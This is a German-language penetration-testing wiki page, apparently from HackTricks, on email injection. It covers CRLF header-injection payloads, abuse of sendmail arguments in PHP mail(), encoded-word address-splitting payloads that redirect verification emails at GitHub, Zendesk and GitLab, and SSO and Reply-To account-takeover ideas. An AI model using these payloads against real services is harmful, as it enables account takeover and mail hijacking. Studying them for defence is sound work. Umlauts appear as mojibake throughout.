# E-Mail-Injektionen

{{#include ../banners/hacktricks-training.md}}

## In gesendete E-Mail injizieren

### Cc und Bcc nach dem Absender-Argument injizieren
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Die Nachricht wird an die Konten des Empf√§ngers und von Empf√§nger1 gesendet.

### Inject-Argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Die Nachricht wird an den urspr√ºnglichen Empf√§nger und das Angreifer-Konto gesendet.

### Inject Subject argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Der gef√§lschte Betreff wird dem urspr√ºnglichen Betreff hinzugef√ºgt und ersetzt ihn in einigen F√§llen. Es h√§ngt vom Verhalten des E-Mail-Dienstes ab.

### √Ñndern Sie den Text der Nachricht

Injizieren Sie einen Zeilenumbruch, und schreiben Sie dann Ihre Nachricht, um den Text der Nachricht zu √§ndern.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() Funktion Ausnutzung
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Der 5. Parameter ($additional_parameters)

Dieser Abschnitt basiert auf **wie man diesen Parameter missbraucht, vorausgesetzt, ein Angreifer kontrolliert ihn**.

Dieser Parameter wird zur Befehlszeile hinzugef√ºgt, die PHP verwenden wird, um das Binary sendmail aufzurufen. Er wird jedoch mit der Funktion `escapeshellcmd($additional_parameters)` bereinigt.

Ein Angreifer kann in diesem Fall **extrahierte Parameter f√ºr sendmail injizieren**.

#### Unterschiede in der Implementierung von /usr/sbin/sendmail

Die **sendmail**-Schnittstelle wird von der MTA-E-Mail-Software (Sendmail, Postfix, Exim usw.) bereitgestellt, die auf dem System installiert ist. Obwohl die **grundlegende Funktionalit√§t** (wie -t -i -f Parameter) aus Kompatibilit√§tsgr√ºnden **gleich bleibt**, variieren **andere Funktionen und Parameter** stark, abh√§ngig vom installierten MTA.

Hier sind einige Beispiele f√ºr verschiedene Man-Seiten des sendmail-Befehls/-schnittstelle:

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

Je nach **Herkunft des sendmail**-Binaries wurden verschiedene Optionen entdeckt, um sie zu missbrauchen und **Dateien zu leaken oder sogar beliebige Befehle auszuf√ºhren**. √úberpr√ºfen Sie, wie in [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## In den E-Mail-Namen injizieren

> [!CAUTION]
> Beachten Sie, dass Sie, wenn Sie es schaffen, ein Konto bei einem Dienst mit einem beliebigen Domainnamen (wie Github, Gitlab, CloudFlare Zero Trust...) zu erstellen und es zu verifizieren, indem Sie die Best√§tigungs-E-Mail an Ihre E-Mail-Adresse erhalten, m√∂glicherweise auf sensible Bereiche des Opferunternehmens zugreifen k√∂nnen.

### Ignorierte Teile einer E-Mail

Die Symbole: **+, -** und **{}** k√∂nnen in seltenen F√§llen zum Taggen verwendet werden und werden von den meisten E-Mail-Servern ignoriert.

- Z.B. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Kommentare in Klammern ()** am Anfang oder Ende werden ebenfalls ignoriert.

- Z.B. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Whitelist-Umgehung

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Zitate

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Sie k√∂nnen auch IPs als Domainnamen in eckigen Klammern verwenden:

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### E-Mail-Codierung

Wie in [**dieser Forschung**](https://portswigger.net/research/splitting-the-email-atom) erkl√§rt, k√∂nnen E-Mail-Namen auch codierte Zeichen enthalten:

- **PHP 256 √úberlauf**: Die PHP-Funktion `chr` wird weiterhin 256 zu einem Zeichen hinzuf√ºgen, bis es positiv wird, und dann die Operation `%256` durchf√ºhren.
- `String.fromCodePoint(0x10000 + 0x40) // êÅÄ ‚Üí @`

> [!TIP]
> Das Ziel dieses Tricks ist es, mit einer Injektion wie `RCPT TO:<"collab@psres.net>collab"@example.com>` zu enden,\
> die die Best√§tigungs-E-Mail an eine andere E-Mail-Adresse als die erwartete sendet (um somit eine andere E-Mail-Adresse innerhalb des E-Mail-Namens einzuf√ºhren und die Syntax beim Senden der E-Mail zu brechen).

Verschiedene Codierungen:
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#¬†iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 ‚Üí x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- Beachte das kodierte `@` als =40, das kodierte `>` als `=3e` und `null` als `=00`&#x20;
- Es wird die Best√§tigungs-E-Mail an `collab@psres.net` gesendet
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- Der gleiche Trick wie zuvor, aber mit einem regul√§ren Anf√ºhrungszeichen am Anfang und dem kodierten Anf√ºhrungszeichen `=22` vor dem kodierten `@` und dann einige Anf√ºhrungszeichen vor der n√§chsten E-Mail, um die intern von Zendesk verwendete Syntax zu korrigieren
- Es wird die Best√§tigungs-E-Mail an `collab@psres.net` gesendet
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- Beachte die Verwendung des Unterstrichs als Leerzeichen zur Trennung der Adresse
- Es wird die Best√§tigungs-E-Mail an `collab@psres.net` gesendet
- Punycode: Mit Punycode war es m√∂glich, ein Tag `<style` in Joomla einzuf√ºgen und es auszunutzen, um das CSRF-Token √ºber CSS-Exfiltration zu stehlen.

#### Tooling

- Es gibt ein **Burp Suite Turbo Intruder-Skript**, um diese Art von Kombinationen zu fuzzern, um E-Mail-Formate anzugreifen. Das Skript hat bereits potenziell funktionierende Kombinationen.
- Es ist auch m√∂glich, [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) zu verwenden, um einen E-Mail-Splitting-Angriff zu erstellen

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

Einige Dienste wie **github** oder **salesforce erlauben** es dir, eine **E-Mail-Adresse mit XSS-Payloads zu erstellen**. Wenn du **diese Anbieter nutzen kannst, um dich bei anderen Diensten anzumelden** und diese Dienste **die E-Mail nicht korrekt bereinigen**, k√∂nntest du **XSS** verursachen.

### Account-Takeover

Wenn ein **SSO-Dienst** es dir erlaubt, **ein Konto zu erstellen, ohne die angegebene E-Mail-Adresse zu verifizieren** (wie **salesforce**) und du dann dieses Konto verwenden kannst, um dich bei einem anderen Dienst anzumelden, der **salesforce vertraut**, k√∂nntest du auf jedes Konto zugreifen.\
&#xNAN;_&#x4E;ote, dass salesforce angibt, ob die angegebene E-Mail verifiziert wurde oder nicht, aber die Anwendung sollte diese Informationen ber√ºcksichtigen._

## Reply-To

Du kannst eine E-Mail senden mit _**From: company.com**_ und _**Replay-To: attacker.com**_ und wenn eine **automatische Antwort** gesendet wird, weil die E-Mail **von** einer **internen Adresse** gesendet wurde, k√∂nnte der **Angreifer** in der Lage sein, diese **Antwort** zu **erhalten**.

## Hard Bounce Rate

Bestimmte Dienste, wie AWS, implementieren einen Schwellenwert, der als **Hard Bounce Rate** bekannt ist, typischerweise auf 10% festgelegt. Dies ist eine kritische Kennzahl, insbesondere f√ºr E-Mail-Zustelldienste. Wenn dieser Wert √ºberschritten wird, kann der Dienst, wie der E-Mail-Dienst von AWS, ausgesetzt oder blockiert werden.

Ein **hard bounce** bezieht sich auf eine **E-Mail**, die an den Absender zur√ºckgesendet wurde, weil die Adresse des Empf√§ngers ung√ºltig oder nicht existent ist. Dies kann aus verschiedenen Gr√ºnden geschehen, wie z.B. dass die **E-Mail** an eine nicht existierende Adresse gesendet wurde, eine Domain, die nicht real ist, oder die Ablehnung des Empf√§ngerservers, **E-Mails** zu akzeptieren.

Im Kontext von AWS, wenn du 1000 E-Mails sendest und 100 davon zu Hard Bounces f√ºhren (aufgrund von Gr√ºnden wie ung√ºltigen Adressen oder Domains), w√ºrde dies eine Hard Bounce Rate von 10% bedeuten. Das Erreichen oder √úberschreiten dieses Wertes kann dazu f√ºhren, dass AWS SES (Simple Email Service) deine E-Mail-Sende-Funktionen blockiert oder aussetzt.

Es ist entscheidend, eine niedrige Hard Bounce Rate aufrechtzuerhalten, um einen ununterbrochenen E-Mail-Service zu gew√§hrleisten und den Absender-Ruf zu wahren. Die √úberwachung und Verwaltung der Qualit√§t der E-Mail-Adressen in deinen Mailinglisten kann erheblich dazu beitragen, dies zu erreichen.

F√ºr detailliertere Informationen kann auf die offizielle Dokumentation von AWS zur Handhabung von Bounces und Beschwerden verwiesen werden [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
